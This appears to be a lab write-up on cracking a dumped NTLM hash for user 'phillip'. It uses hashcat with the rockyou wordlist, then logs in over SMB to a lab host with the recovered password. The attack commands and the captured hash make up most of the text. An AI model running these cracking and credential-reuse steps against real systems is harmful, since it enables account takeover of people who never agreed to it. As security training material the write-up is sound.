
NTLM hashes are **unsalted**, making them suitable for offline cracking.

the following NTLM hash for the user `phillip`:
```text
phillip:1106:aad3b435b51404eeaad3b435b51404ee:939B0058BC6DD834ABC4CC08CFEFEA69:::
```
The format follows the standard NTLM hash format: `username:uid:LM_hash:NTLM_hash:::`

So the NTLM hash we need to crack is:  (the right side)
```text
939B0058BC6DD834ABC4CC08CFEFEA69
```

### Hashcat
```bash
hashcat -m 1000 hash.txt rockyou.txt
```
- `-m 1000` → NTLM hash mode.
- `hash.txt` → file containing the hash.

Show cracked passwords:
```bash
hashcat -m 1000 hash.txt --show
```

Then authenticate with the recovered password to check:
```bash
smbclient.py 'thm.loc/phillip:<PASSWORD>'@192.168.11.51
```

**Concept:**
```text
NTLM Hash → Crack → Password → Normal Authentication
```

**Why This Works:** NTLM hashes are unsalted and use the relatively fast MD4 algorithm, making them extremely quick to crack with modern hardware. Weak passwords fall quickly to dictionary and rule-based attacks.